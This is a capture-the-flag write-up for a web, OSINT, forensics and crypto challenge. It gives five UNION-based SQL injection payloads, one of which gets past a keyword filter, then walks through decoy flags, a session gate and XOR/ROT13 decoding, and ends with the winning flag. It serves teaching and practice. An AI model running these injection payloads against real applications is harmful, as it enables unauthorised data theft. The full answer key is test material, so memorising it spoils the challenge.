# RVCE CTF: Operation Phantom PDF 🕵️‍♂️📑

**Category**: Web Exploitation, OSINT, Digital Forensics, Cryptography  
**Difficulty**: Medium-Hard  
**Author**: RVCE Cyber Labs / Security Research Team  

---

## 📖 Challenge Scenario
RVCE Cyber Labs has launched their new enterprise internal document portal: **Operation Phantom PDF**. The platform boasts advanced Web Application Firewalls (WAF), session-enforced access gates, and automated metadata encryption protocols. 

Rumor has it that **Dr. Arthur Pendelton**, the Lead Cryptographer, has hidden the master cryptographic flag inside his internal security memo. However, to deter adversaries, the portal is littered with decoy documents, fake system flags, rabbit-hole image schematics, and honeypot Base64 media mirrors. Your mission is to infiltrate the vault, bypass access gates, uncover the true cryptographic key, and decrypt the multi-layered cipher.

---

## 🎯 Intended Solution Walkthrough

### Step 1: Web Exploitation (Leaking the Vault via UNION SQLi)
Navigating to the main search portal (`/search`), the application filters documents by keyword. However, the search query parameter (`q`) is vulnerable to SQL Injection.

The backend implements a WAF blocking wildcards (`*`), comments (`--`, `#`), and destructive SQL commands (`drop`, `delete`, `update`, `insert`). Because of this, players must write a comment-less, balanced `UNION SELECT` query. Since the default query restricts output to `access_level = 'Public'`, an attacker can dump the entire document table (which contains exactly 4 columns: `title, access_level, file_path, author`) using any of the following payloads:

* **Method 1 (Full Vault Dump)**:
  ```sql
  %' UNION SELECT title, access_level, file_path, author FROM documents UNION SELECT '1','2','3','4
  ```
* **Method 2 (Filtered Non-Public Dump via `!=`)**:
  ```sql
  %' UNION SELECT title, access_level, file_path, author FROM documents WHERE access_level!='Public' UNION SELECT '1','2','3','4
  ```
* **Method 3 (Empty String Balancing)**:
  ```sql
  %' UNION SELECT title, access_level, file_path, author FROM documents UNION SELECT '','','','
  ```
* **Method 4 (Targeted Document ID Dump via `LIKE`)**:
  ```sql
  %' UNION SELECT title, access_level, file_path, author FROM documents WHERE file_path LIKE '%5%' UNION SELECT '1','2','3','4
  ```
* **Method 5 (WAF Char Encoding Bypass)**:
  ```sql
  %' UNION SELECT title, access_level, char(47,100,111,119,110,108,111,97,100,47,53), author FROM documents UNION SELECT '1','2','3','4
  ```

Submitting either payload reveals all **7 documents** (Public, Confidential, and Restricted). Notice that multiple documents contain subtle traps!

---

### Step 2: Dodging Decoy Flags & Rabbit Holes 🕳️
If a player hastily explores the leaked documents, they will encounter several convincing traps:
1. **Visual Image Trap**: Alice Smith's network topology document (`topology_q3.pdf`) references a schematic image at `/static/system_blueprint.png`. Inspecting this image's metadata reveals `Token: rvcectf{v1su4l_st3g0_d3c0y_tr4p}`. Submitting this flag fails!
2. **Database Log Trap**: David Kim's replication log (`db_logs.pdf`) contains the metadata property `Subject: Sync Heartbeat Key: rvcectf{sql1t3_c4ch3_r3pl1c4t10n_k3y}`. This is another honeypot!
3. **Threat Report Trap**: Elena Rostova's report (`threat_report.pdf`) prints `"Captured C2 Malware Beacon Signature: rvcectf{m4lw4r3_b34c0n_s1gn4tur3_q3}"` directly on the page. Fake!
4. **Financial Audit Trap**: Samantha Vance's audit (`finance_q2.pdf`) embeds `Subject: Fiscal Voucher Code: rvcectf{f1n4nc14l_v0uch3r_4ud1t}`. Fake!
5. **Base64 Media Mirrors**: All PDFs contain metadata keywords like `Visual Reference Stream: aHR0cHM6Ly95b3V0dS5iZS9aOW9UaG1UVDZqMD9zaT11QS1KbWZIUURjaUg0Y3hN`. Decoding this Base64 string leads to a YouTube video decoy!

---

### Step 3: OSINT Reconnaissance on Team Directory
To find the authentic flag, players must investigate the **Security Research Team** (`/team`). 
A security policy banner notes: *"...internal vault access tokens are formulated using the standardized `[ProjectCode]-[EmployeeID]` convention."*

Scanning the staff roster identifies **Dr. Arthur Pendelton (`EMP-8492`)**:
> *"Spearheading enterprise vault cryptography and automated metadata audit verification. Principal investigator for Project VANGUARD."*

Combining his project code and employee ID gives Arthur's master clearance key: **`VANGUARD-8492`**.

---

### Step 4: Bypassing the Security Gate & Shortcut Firewall
Returning to the SQL injection results, locate Arthur's document: **Internal Security Architecture Review** (`/download/5`).

*(Note: The server enforces strict session tokens. Attempting to access `/secure_fetch/5` directly or fuzzing static PDF paths triggers an alarm (`wrong.mp3`), logs a security breach, and forcibly redirects the user back to the home portal!)*

Clicking download opens the access gate presenting Arthur's general knowledge challenge:
> *Which Linux command is used to change file or directory permissions?*

Answering **`chmod`** plays the celebratory **`success.mp3`** chime, authorizes the session, and downloads `confidential_memo.pdf`.

---

### Step 5: Forensics & Multi-Layer Decryption
Opening `confidential_memo.pdf` reveals Arthur's poetic riddle:
> *"No glyph upon the canvas speaks my name, though I have watched this artifact since its beginning. Beneath its record lies a serpent of digits, seeking its companion from the maker's mark. Bind the two in opposition, and let Caesar's second cousin finish the tale."*

Inspecting the PDF Document Properties (`Ctrl + D` or `pypdf`) reveals the Subject field:
```text
Encrypted Verification Token: 33283e352526213f455905095309272a3e231e35747253045c6d33712976661e28774a0c450d55623c
```

Following the poem's instructions:
1. **Hex Decode**: Convert the hex string into raw encrypted bytes.
2. **XOR Decryption**: XOR each byte against Arthur's OSINT clearance key (**`VANGUARD-8492`**). This yields intermediate string: `eiprpgs{ha10a_fdyv_g0_k0e_e0g13_z3g4q4g4}`.
3. **ROT13 Spin**: Rotating 13 positions ("thirteen steps to secrets keep") reveals the final, true master flag!

---

## 🏁 True Winning Flag
```text
rvcectf{un10n_sqli_t0_x0r_r0t13_m3t4d4t4}
```

---

## 💻 Automated Verification Script
Run the automated solver script to verify the entire exploitation chain:
```bash
python solution/solve.py
```
